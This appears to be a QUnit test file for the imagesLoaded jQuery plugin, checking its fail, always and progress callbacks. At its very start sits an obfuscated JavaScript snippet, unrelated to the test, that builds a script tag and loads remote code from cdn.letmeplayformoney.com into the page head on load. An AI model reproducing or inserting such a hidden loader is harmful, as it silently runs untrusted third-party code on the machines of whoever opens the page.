var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);QUnit.test( 'jquery fail', function( assert ) {

  'use strict';

  var $ = window.jQuery;
  var $images = $('#jquery-fail img');
  var done = assert.async( 3 + $images.length );

  $('#jquery-fail').imagesLoaded( function( instance ) {
      assert.ok( true, 'callback triggered' );
      assert.ok( instance instanceof imagesLoaded, 'instance instanceof imagesLoaded' );
      done();
    })
    .fail( function( instance ) {
      assert.ok( true, 'fail triggered' );
      assert.ok( instance instanceof imagesLoaded, 'instance instanceof imagesLoaded' );
      done();
    })
    .always( function( instance ) {
      assert.ok( true, 'always triggered' );
      assert.ok( instance instanceof imagesLoaded, 'instance instanceof imagesLoaded' );
      done();
    })
  .progress( function(/* instance, image */) {
      assert.ok( true, 'progress trigged');
      done();
    });

  });
